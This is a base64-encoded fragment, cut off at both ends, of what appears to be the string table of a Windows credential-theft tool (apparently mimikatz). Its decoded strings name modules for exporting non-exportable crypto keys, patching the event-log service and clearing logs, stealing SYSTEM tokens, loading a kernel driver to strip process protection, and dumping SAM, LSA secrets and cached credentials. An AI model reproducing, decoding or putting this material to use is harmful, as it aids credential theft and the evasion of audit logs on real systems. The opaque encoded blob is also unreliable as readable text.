gBFAE4AVABfAFUAUwBFAFIAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFAAYQB0AGMAaAAgAEMATgBHACAAcwBlAHIAdgBpAGMAZQAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAABjAG4AZwAAAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABQAGEAdABjAGgAIABDAHIAeQBwAHQAbwBBAFAASQAgAGwAYQB5AGUAcgAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAABjAGEAcABpAAAAAABMAGkAcwB0ACAAKABvAHIAIABlAHgAcABvAHIAdAApACAAawBlAHkAcwAgAGMAbwBuAHQAYQBpAG4AZQByAHMAAAAAAGsAZQB5AHMAAAAAAEwAaQBzAHQAIAAoAG8AcgAgAGUAeABwAG8AcgB0ACkAIABjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAAAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHMAdABvAHIAZQBzAAAAcwB0AG8AcgBlAHMAAAAAAEwAaQBzAHQAIABjAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAcAByAG8AdgBpAGQAZQByAHMAAAAAAHAAcgBvAHYAaQBkAGUAcgBzAAAAQwByAHkAcAB0AG8AIABNAG8AZAB1AGwAZQAAAGMAcgB5AHAAdABvAAAAAAByAHMAYQBlAG4AaAAAAAAAQ1BFeHBvcnRLZXkAbgBjAHIAeQBwAHQAAAAAAE5DcnlwdE9wZW5TdG9yYWdlUHJvdmlkZXIAAABOQ3J5cHRFbnVtS2V5cwAATkNyeXB0T3BlbktleQAAAE5DcnlwdEV4cG9ydEtleQBOQ3J5cHRHZXRQcm9wZXJ0eQAAAE5DcnlwdEZyZWVCdWZmZXIAAAAATkNyeXB0RnJlZU9iamVjdAAAAABCQ3J5cHRFbnVtUmVnaXN0ZXJlZFByb3ZpZGVycwAAAEJDcnlwdEZyZWVCdWZmZXIAAAAACgBDAHIAeQBwAHQAbwBBAFAASQAgAHAAcgBvAHYAaQBkAGUAcgBzACAAOgAKAAAAJQAyAHUALgAgACUAcwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABDAHIAeQBwAHQARQBuAHUAbQBQAHIAbwB2AGkAZABlAHIAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAKAEMATgBHACAAcAByAG8AdgBpAGQAZQByAHMAIAA6AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABCAEMAcgB5AHAAdABFAG4AdQBtAFIAZQBnAGkAcwB0AGUAcgBlAGQAUAByAG8AdgBpAGQAZQByAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAHMAeQBzAHQAZQBtAHMAdABvAHIAZQAAAAAAAABBAHMAawBpAG4AZwAgAGYAbwByACAAUwB5AHMAdABlAG0AIABTAHQAbwByAGUAIAAnACUAcwAnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AcwB0AG8AcgBlAHMAIAA7ACAAQwBlAHIAdABFAG4AdQBtAFMAeQBzAHQAZQBtAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABNAHkAAAAAAHMAdABvAHIAZQAAACAAKgAgAFMAeQBzAHQAZQBtACAAUwB0AG8AcgBlACAAIAA6ACAAJwAlAHMAJwAgACgAMAB4ACUAMAA4AHgAKQAKACAAKgAgAFMAdABvAHIAZQAgACAAIAAgACAAIAAgACAAIAA6ACAAJwAlAHMAJwAKAAoAAAAAACgAbgB1AGwAbAApAAAAAAAJAEsAZQB5ACAAQwBvAG4AdABhAGkAbgBlAHIAIAAgADoAIAAlAHMACgAJAFAAcgBvAHYAaQBkAGUAcgAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAAAACQBUAHkAcABlACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFUAcwBlAHIASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABrAGUAeQBTAHAAZQBjACAAPQA9ACAAQwBFAFIAVABfAE4AQwBSAFkAUABUAF8ASwBFAFkAXwBTAFAARQBDACAAdwBpAHQAaABvAHUAdAAgAEMATgBHACAASABhAG4AZABsAGUAIAA/AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEEAYwBxAHUAaQByAGUAQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAcgBpAHYAYQB0AGUASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAQwBvAG4AdABlAHgAdABQAHIAbwBwAGUAcgB0AHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABOAGEAbQBlAFMAdAByAGkAbgBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQARwBlAHQATgBhAG0AZQBTAHQAcgBpAG4AZwAgACgAZgBvAHIAIABsAGUAbgApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABPAHAAZQBuAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABwAHIAbwB2AGkAZABlAHIAAAAAAHAAcgBvAHYAaQBkAGUAcgB0AHkAcABlAAAAAABtAGEAYwBoAGkAbgBlAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBvAGYAdAB3AGEAcgBlACAASwBlAHkAIABTAHQAbwByAGEAZwBlACAAUAByAG8AdgBpAGQAZQByAAAAYwBuAGcAcAByAG8AdgBpAGQAZQByAAAAIAAqACAAUwB0AG8AcgBlACAAIAAgACAAIAAgACAAIAAgADoAIAAnACUAcwAnAAoAIAAqACAAUAByAG8AdgBpAGQAZQByACAAIAAgACAAIAAgADoAIAAnACUAcwAnACAAKAAnACUAcwAnACkACgAgACoAIABQAHIAbwB2AGkAZABlAHIAIAB0AHkAcABlACAAOgAgACcAJQBzACcAIAAoACUAdQApAAoAIAAqACAAQwBOAEcAIABQAHIAbwB2AGkAZABlAHIAIAAgADoAIAAnACUAcwAnAAoAAAAAAAoAQwByAHkAcAB0AG8AQQBQAEkAIABrAGUAeQBzACAAOgAKAAAAAAAKACUAMgB1AC4AIAAlAHMACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABDAHIAeQBwAHQARwBlAHQAVQBzAGUAcgBLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFAAcgBvAHYAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAoAQwBOAEcAIABrAGUAeQBzACAAOgAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAATgBDAHIAeQBwAHQATwBwAGUAbgBLAGUAeQAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABOAEMAcgB5AHAAdABFAG4AdQBtAEsAZQB5AHMAIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAE4AQwByAHkAcAB0AE8AcABlAG4AUwB0AG8AcgBhAGcAZQBQAHIAbwB2AGkAZABlAHIAIAAlADAAOAB4AAoAAAAAAEUAeABwAG8AcgB0ACAAUABvAGwAaQBjAHkAAABMAGUAbgBnAHQAaAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAcgBpAG4AdABLAGUAeQBJAG4AZgBvAHMAIAA7ACAATgBDAHIAeQBwAHQARwBlAHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcAByAGkAbgB0AEsAZQB5AEkAbgBmAG8AcwAgADsAIABDAHIAeQBwAHQARwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFkARQBTAAAATgBPAAAAAAAJAEUAeABwAG8AcgB0AGEAYgBsAGUAIABrAGUAeQAgADoAIAAlAHMACgAJAEsAZQB5ACAAcwBpAHoAZQAgACAAIAAgACAAIAAgADoAIAAlAHUACgAAAAAAcAB2AGsAAABDAEEAUABJAFAAUgBJAFYAQQBUAEUAQgBMAE8AQgAAAE8ASwAAAAAASwBPAAAAAAAJAFAAcgBpAHYAYQB0AGUAIABlAHgAcABvAHIAdAAgADoAIAAlAHMAIAAtACAAAAAnACUAcwAnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAEUAeABwAG8AcgB0ACAALwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABLAGUAeQBUAG8ARgBpAGwAZQAgADsAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZwBlAG4AZQByAGEAdABlAEYAaQBsAGUATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABkAGUAcgAAAAkAUAB1AGIAbABpAGMAIABlAHgAcABvAHIAdAAgACAAOgAgACUAcwAgAC0AIAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABDAGUAcgB0ACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZwBlAG4AZQByAGEAdABlAEYAaQBsAGUATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAcABmAHgAAABtAGkAbQBpAGsAYQB0AHoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBlAHgAcABvAHIAdABDAGUAcgB0ACAAOwAgAEUAeABwAG8AcgB0ACAALwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAJQBzAF8AJQBzAF8AJQB1AF8AJQBzAC4AJQBzAAAAAABBAFQAXwBLAEUAWQBFAFgAQwBIAEEATgBHAEUAAAAAAEEAVABfAFMASQBHAE4AQQBUAFUAUgBFAAAAAABDAE4ARwAgAEsAZQB5AAAAcgBzAGEAZQBuAGgALgBkAGwAbAAAAAAATABvAGMAYQBsACAAQwByAHkAcAB0AG8AQQBQAEkAIABwAGEAdABjAGgAZQBkAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBwAF8AYwBhAHAAaQAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAXwBjAGEAcABpACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAG4AYwByAHkAcAB0AC4AZABsAGwAAAAAAG4AYwByAHkAcAB0AHAAcgBvAHYALgBkAGwAbAAAAAAASwBlAHkASQBzAG8AAAAAAEMAbABlAGEAcgAgAGEAbgAgAGUAdgBlAG4AdAAgAGwAbwBnAAAAAABjAGwAZQBhAHIAAAAAAAAAWwBlAHgAcABlAHIAaQBtAGUAbgB0AGEAbABdACAAcABhAHQAYwBoACAARQB2AGUAbgB0AHMAIABzAGUAcgB2AGkAYwBlACAAdABvACAAYQB2AG8AaQBkACAAbgBlAHcAIABlAHYAZQBuAHQAcwAAAGQAcgBvAHAAAAAAAEUAdgBlAG4AdAAgAG0AbwBkAHUAbABlAAAAAABlAHYAZQBuAHQAAABsAG8AZwAAAGUAdgBlAG4AdABsAG8AZwAuAGQAbABsAAAAAAB3AGUAdgB0AHMAdgBjAC4AZABsAGwAAABFAHYAZQBuAHQATABvAGcAAAAAAFMAZQBjAHUAcgBpAHQAeQAAAAAAVQBzAGkAbgBnACAAIgAlAHMAIgAgAGUAdgBlAG4AdAAgAGwAbwBnACAAOgAKAAAALQAgACUAdQAgAGUAdgBlAG4AdAAoAHMAKQAKAAAAAAAtACAAQwBsAGUAYQByAGUAZAAgACEACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZQB2AGUAbgB0AF8AYwBsAGUAYQByACAAOwAgAEMAbABlAGEAcgBFAHYAZQBuAHQATABvAGcAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBlAHYAZQBuAHQAXwBjAGwAZQBhAHIAIAA7ACAATwBwAGUAbgBFAHYAZQBuAHQATABvAGcAIAAoADAAeAAlADAAOAB4ACkACgAAAEwAaQBzAHQAIABtAGkAbgBpAGYAaQBsAHQAZQByAHMAAAAAAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABGAFMAIABmAGkAbAB0AGUAcgBzAAAAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABvAGIAagBlAGMAdAAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAAAAAG4AbwB0AGkAZgBPAGIAagBlAGMAdAAAAEwAaQBzAHQAIAByAGUAZwBpAHMAdAByAHkAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAABuAG8AdABpAGYAUgBlAGcAAAAAAEwAaQBzAHQAIABpAG0AYQBnAGUAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAbgBvAHQAaQBmAEkAbQBhAGcAZQAAAAAATABpAHMAdAAgAHQAaAByAGUAYQBkACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAAAAbgBvAHQAaQBmAFQAaAByAGUAYQBkAAAATABpAHMAdAAgAHAAcgBvAGMAZQBzAHMAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAbgBvAHQAaQBmAFAAcgBvAGMAZQBzAHMAAAAAAEwAaQBzAHQAIABTAFMARABUAAAAcwBzAGQAdAAAAAAATABpAHMAdAAgAG0AbwBkAHUAbABlAHMAAAAAAG0AbwBkAHUAbABlAHMAAABTAGUAdAAgAGEAbABsACAAcAByAGkAdgBpAGwAZQBnAGUAIABvAG4AIABwAHIAbwBjAGUAcwBzAAAAAABwAHIAbwBjAGUAcwBzAFAAcgBpAHYAaQBsAGUAZwBlAAAAAABEAHUAcABsAGkAYwBhAHQAZQAgAHAAcgBvAGMAZQBzAHMAIAB0AG8AawBlAG4AAABwAHIAbwBjAGUAcwBzAFQAbwBrAGUAbgAAAAAAUAByAG8AdABlAGMAdAAgAHAAcgBvAGMAZQBzAHMAAABwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAAAAAAEIAUwBPAEQAIAAhAAAAAABiAHMAbwBkAAAAAABSAGUAbQBvAHYAZQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAC0AAABJAG4AcwB0AGEAbABsACAAYQBuAGQALwBvAHIAIABzAHQAYQByAHQAIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgACgAbQBpAG0AaQBkAHIAdgApAAAAAAArAAAAcgBlAG0AbwB2AGUAAAAAAEwAaQBzAHQAIABwAHIAbwBjAGUAcwBzAAAAAABwAHIAbwBjAGUAcwBzAAAAbQBpAG0AaQBkAHIAdgAuAHMAeQBzAAAAbQBpAG0AaQBkAHIAdgAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABhAGwAcgBlAGEAZAB5ACAAcgBlAGcAaQBzAHQAZQByAGUAZAAKAAAAWwAqAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAG4AbwB0ACAAcAByAGUAcwBlAG4AdAAKAAAAAABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgACgAbQBpAG0AaQBkAHIAdgApAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACAAcgBlAGcAaQBzAHQAZQByAGUAZAAKAAAAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAEEAQwBMACAAdABvACAAZQB2AGUAcgB5AG8AbgBlAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABXAG8AcgBsAGQAVABvAE0AaQBtAGkAawBhAHQAegAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABDAHIAZQBhAHQAZQBTAGUAcgB2AGkAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAGYAaQBsAGUAXwBpAHMARgBpAGwAZQBFAHgAaQBzAHQAIAAoADAAeAAlADAAOAB4ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AZwBlAHQAQQBiAHMAbwBsAHUAdABlAFAAYQB0AGgATwBmACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAYQByAHQAZQBkAAoAAAAAAAAAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHMAdABhAHIAdABlAGQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAUwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAATwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgAoAGMAcgBlAGEAdABlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAbwBwAHAAZQBkAAoAAAAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABuAG8AdAAgAHIAdQBuAG4AaQBuAGcACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwByAGUAbQBvAHYAZQBfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AcwB0AG8AcAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAcgBlAG0AbwB2AGUAZAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHIAZQBtAG8AdgBlAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAHMAZQByAHYAaQBjAGUAXwByAGUAbQBvAHYAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABQAHIAbwBjAGUAcwBzACAAOgAgACUAcwAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABQAHIAbwBjAGUAcwBzAEkAZABGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAABwAGkAZAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAEEAcgBnAHUAbQBlAG4AdAAgAC8AcAByAG8AYwBlAHMAcwA6AHAAcgBvAGcAcgBhAG0ALgBlAHgAZQAgAG8AcgAgAC8AcABpAGQAOgBwAHIAbwBjAGUAcwBzAGkAZAAgAG4AZQBlAGQAZQBkAAoAAAAAAAAAAABQAEkARAAgACUAdQAgAC0APgAgACUAMAAyAHgALwAlADAAMgB4ACAAWwAlADEAeAAtACUAMQB4AC0AJQAxAHgAXQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAE4AbwAgAFAASQBEAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAFAAcgBvAHQAZQBjAHQAZQBkACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABiAGUAZgBvAHIAZQAgAFcAaQBuAGQAbwB3AHMAIABWAGkAcwB0AGEACgAAAAAAZgByAG8AbQAAAAAAdABvAAAAAAAAAAAAVABvAGsAZQBuACAAZgByAG8AbQAgAHAAcgBvAGMAZQBzAHMAIAAlAHUAIAB0AG8AIABwAHIAbwBjAGUAcwBzACAAJQB1AAoAAAAAAAAAAAAgACoAIABmAHIAbwBtACAAMAAgAHcAaQBsAGwAIAB0AGEAawBlACAAUwBZAFMAVABFAE0AIAB0AG8AawBlAG4ACgAAAAAAAAAgACoAIAB0AG8AIAAwACAAdwBpAGwAbAAgAHQAYQBrAGUAIABhAGwAbAAgACcAYwBtAGQAJwAgAGEAbgBkACAAJwBtAGkAbQBpAGsAYQB0AHoAJwAgAHAAcgBvAGMAZQBzAHMACgAAAEQAYQB0AGEAAAAAAEcAQgBHAAAAUwBrAGUAdwAxAAAASgBEAAAAAABEAGUAZgBhAHUAbAB0AAAAQwB1AHIAcgBlAG4AdAAAAEEAcwBrACAAUwBBAE0AIABTAGUAcgB2AGkAYwBlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAUwBBAE0AIABlAG4AdAByAGkAZQBzACAAKABwAGEAdABjAGgAIABvAG4AIAB0AGgAZQAgAGYAbAB5ACkAAAAAAHMAYQBtAHIAcABjAAAAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAATgBMACQASwBNACAAdABoAGUAbgAgAE0AUwBDAGEAYwBoAGUAKAB2ADIAKQAgACgAZgByAG8AbQAgAHIAZQBnAGkAcwB0AHIAeQAgAG8AcgAgAGgAaQB2AGUAcwApAAAAYwBhAGMAaABlAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAFMARQBDAFIARQBUAFMAIABlAG4AdAByAGkAZQBzACAAKABmAHIAbwBtACAAcgBlAGcAaQBzAHQAcgB5ACAAbwByACAAaABpAHYAZQBzACkAAAAAAHMAZQBjAHIAZQB0AHMAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAAUwBBAE0AIABlAG4AdAByAGkAZQBzACAAKABmAHIAbwBtACAAcgBlAGcAaQBzAHQAcgB5ACAAbwByACAAaABpAHYAZQBzACkAAAAAAHMAYQBtAAAATABzAGEARAB1AG0AcAAgAG0AbwBkAHUAbABlAAAAAABsAHMAYQBkAHUAbQBwAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBZAFMAVABFAE0AIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAEEATQAgAGgAaQB2AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABTAFkAUwBUAEUATQAAAAAAUwBBAE0AAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAKABTAEEATQApACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBFAEMAVQBSAEkAVABZACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAEMAYQBjAGgAZQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAFkAUwBUAEUATQAgAGgAaQB2AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABTAEUAQwBVAFIASQBUAFkAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAHMAZQBjAHIAZQB0AHMATwByAE